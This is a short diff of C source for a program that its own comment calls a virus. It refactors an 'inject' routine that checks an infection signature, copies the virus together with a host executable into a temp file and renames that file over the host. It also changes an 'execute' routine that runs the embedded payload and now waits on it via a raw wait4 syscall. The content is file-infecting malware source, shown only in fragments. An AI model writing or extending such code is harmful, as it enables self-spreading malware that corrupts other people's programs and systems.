@@ -1,9 +1,9 @@
 #include "woody.h"
 #include "buzz_buzzard.h"
 #include <sys/stat.h>
-#include <sys/sendfile.h>
-#include <sys/wait.h>
+#include <sys/syscall.h>
 #include <errno.h>
+#include <sys/types.h>
 extern unsigned char src_buzz_buzzard_bin[];
 extern unsigned int src_buzz_buzzard_bin_len;
 
@@ -79,11 +79,11 @@ void execute(int vfd, mode_t mode, int totalSize, char *argv[], char *const envp
 		printf("\n");
 		exit(1);
 	}
-	waitpid(pid, NULL, 0);
+	syscall(SYS_wait4, pid, NULL, 0);
 	unlink("../tempfile");
 }
 /*This function create a file that will contain the copy of the virus and the host file*/
-void inject(char *host_file, int vfd)
+int inject(char *host_file, int vfd)
 {
 	/*Open the host file*/
 	int hfd = open(host_file, O_RDONLY);
@@ -99,7 +99,7 @@ void inject(char *host_file, int vfd)
 	if (strcmp(sig_check, signature) == 0)
 	{
 		printf("Signature matches.\n");
-		return;
+		return (0);
 	}
 	else
 	{
@@ -116,6 +116,7 @@ void inject(char *host_file, int vfd)
 	rename("/home/atila/temp/tempfile", host_file);
 	close(tfd);
 	close(hfd);
+	return (1);
 }
 
 int main(int argc, char *argv[], char *const envp[])
